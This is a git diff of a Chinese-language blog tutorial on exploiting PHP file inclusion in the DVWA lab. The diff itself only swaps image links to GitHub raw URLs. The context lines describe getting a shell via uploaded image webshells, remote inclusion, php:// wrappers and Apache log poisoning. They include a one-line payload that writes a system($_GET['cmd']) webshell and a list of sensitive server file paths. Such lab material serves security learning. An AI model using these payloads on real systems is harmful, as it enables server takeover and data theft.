@@ -18,33 +18,33 @@
 <h2 id="2、漏洞探测"><a href="#2、漏洞探测" class="headerlink" title="2、漏洞探测"></a>2、漏洞探测</h2><h3 id="一-、漏洞探测"><a href="#一-、漏洞探测" class="headerlink" title="(一)、漏洞探测"></a>(一)、漏洞探测</h3><p>1、观察URL链接是否包括以下类似的关键字：page/include/path/file/link/url等，如果有，则可能存在文件包含漏洞；   </p>
 <p>2、可以观察在URL中，出现的赋值参数等号后跟的信息，是否为一个文件，如果是，则可能存在文件包含漏洞；   </p>
 <center>
-<img src="/php-include/1.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/1.PNG" widith="50%">
 </center>
 
 <h3 id="二-、尝试包含其他文件，测试是否能包含-如：phpinfo等"><a href="#二-、尝试包含其他文件，测试是否能包含-如：phpinfo等" class="headerlink" title="(二)、尝试包含其他文件，测试是否能包含(如：phpinfo等)"></a>(二)、尝试包含其他文件，测试是否能包含(如：phpinfo等)</h3><p>因为我们知道DVWA网站根目录存在phpinfo文件，故尝试包含它。   </p>
 <center>
-<img src="/php-include/2.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/2.PNG" widith="50%">
 </center>
 
 
 <h2 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h2><p>常见的文件包含的利用方式:<br>1、通过网站的上传功能,上传一张图片马，然后包含这张图片从而getshell。<br>2、如果网站允许远程文件包含，通过远程包含我们服务器下的文件从而getshell。<br>3、通过PHP伪协议去读取网站文件或者写一句话。<br>4、如果网站使用Apache搭建，尝试包含日志getshell。</p>
 <h3 id="一-、通过上传方式getshell"><a href="#一-、通过上传方式getshell" class="headerlink" title="(一)、通过上传方式getshell"></a>(一)、通过上传方式getshell</h3><p>对网站上传一张图片，图片里面是一个phpinfo语句。   </p>
 <center>
-<img src="/php-include/3.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/3.PNG" widith="50%">
 </center>
 
 <p>../../hackable/uploads/123.jpg 是上传的路径，尝试包含这个上传路径。   </p>
 <center>
-<img src="/php-include/4.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/4.PNG" widith="50%">
 </center>
 
 <h3 id="二-、远程文件包含"><a href="#二-、远程文件包含" class="headerlink" title="(二)、远程文件包含"></a>(二)、远程文件包含</h3><p>在自己的网站下准备一个txt，还要对方开启 allow_url_include = On</p>
 <center>
-<img src="/php-include/8.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/8.PNG" widith="50%">
 </center>  
 通过远程文件包含并执行命令
 <center>
-<img src="/php-include/9.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/9.PNG" widith="50%">
 </center>  
 
 <h3 id="三-、通过PHP伪协议读取文件和写shell"><a href="#三-、通过PHP伪协议读取文件和写shell" class="headerlink" title="(三)、通过PHP伪协议读取文件和写shell"></a>(三)、通过PHP伪协议读取文件和写shell</h3><pre><code>file://        访问本地文件系统  
@@ -60,15 +60,15 @@ Glob://        查找匹配的文件路径
 </code></pre>
 <h4 id="1、利用file读取文件"><a href="#1、利用file读取文件" class="headerlink" title="1、利用file读取文件"></a>1、利用file读取文件</h4><p>在测试机器上准备一个txt，通过协议去读取其中的内容</p>
 <center>
-<img src="/php-include/10.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/10.PNG" widith="50%">
 </center> 
 <center>
-<img src="/php-include/11.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/11.PNG" widith="50%">
 </center> 
 
 <h4 id="2、通过php-input写入一句话"><a href="#2、通过php-input写入一句话" class="headerlink" title="2、通过php://input写入一句话"></a>2、通过php://input写入一句话</h4><p>使用PHP://input 时，通过post提交参数</p>
 <center>
-<img src="/php-include/12.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/12.PNG" widith="50%">
 </center> 
 
 <p>写shell<br>把刚才的POST内容替换，替换成下面的语句，就会在当前路径下写入一个shell.php<br>注意：要当前路径有写入权限才能写进入，否则就要找一个有写入权限的目录去写入  </p>
@@ -76,7 +76,7 @@ Glob://        查找匹配的文件路径
 &lt;?php fputs(fopen(&#39;../../upload/image/shell.php&#39;,&#39;w&#39;),&#39;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#39;);?&gt;
 </code></pre>
 <center>
-<img src="/php-include/13.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/13.PNG" widith="50%">
 </center> 
 
 <h3 id="四-、通过本地包含日志getshell"><a href="#四-、通过本地包含日志getshell" class="headerlink" title="(四)、通过本地包含日志getshell"></a>(四)、通过本地包含日志getshell</h3><pre><code>常见的敏感路径：
@@ -128,23 +128,23 @@ C:/Windows/system32/inetsrv/metabase.xml
 C:\Windows\System32\inetsrv\config\applicationHost.config
 </code></pre>
 <h4 id="1、查看本地APCHE日志"><a href="#1、查看本地APCHE日志" class="headerlink" title="1、查看本地APCHE日志"></a>1、查看本地APCHE日志</h4><center>
-<img src="/php-include/16.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/16.PNG" widith="50%">
 </center>
 
 <h4 id="2、写入一句话phpinfo"><a href="#2、写入一句话phpinfo" class="headerlink" title="2、写入一句话phpinfo"></a>2、写入一句话phpinfo</h4><center>
-<img src="/php-include/17.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/17.PNG" widith="50%">
 </center>
 
 <h4 id="3、通过burp抓包写入，不然会有URL编码"><a href="#3、通过burp抓包写入，不然会有URL编码" class="headerlink" title="3、通过burp抓包写入，不然会有URL编码"></a>3、通过burp抓包写入，不然会有URL编码</h4><center>
-<img src="/php-include/18.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/18.PNG" widith="50%">
 </center>  
 
 <center>
-<img src="/php-include/19.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/19.PNG" widith="50%">
 </center>
 
 <h4 id="4、访问包含的日志"><a href="#4、访问包含的日志" class="headerlink" title="4、访问包含的日志"></a>4、访问包含的日志</h4><center>
-<img src="/php-include/20.png" widith="50%">
+<img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/php-include/20.PNG" widith="50%">
 </center>
 
 <h4 id="5、注意事项"><a href="#5、注意事项" class="headerlink" title="5、注意事项"></a>5、注意事项</h4><p>无论是通过 curl方式和网页的形式都会有URL编码，所以要注意编码的问题<br>curl构造一句话时，需要注意两点：<br>1、请求的资源对象，需要被双引号包含，不然会报错；<br>2、php一句话中的 综括号[ ]curl是特殊符号，需要进行转义 [ ]，不然curl使用时也会报错；  </p>
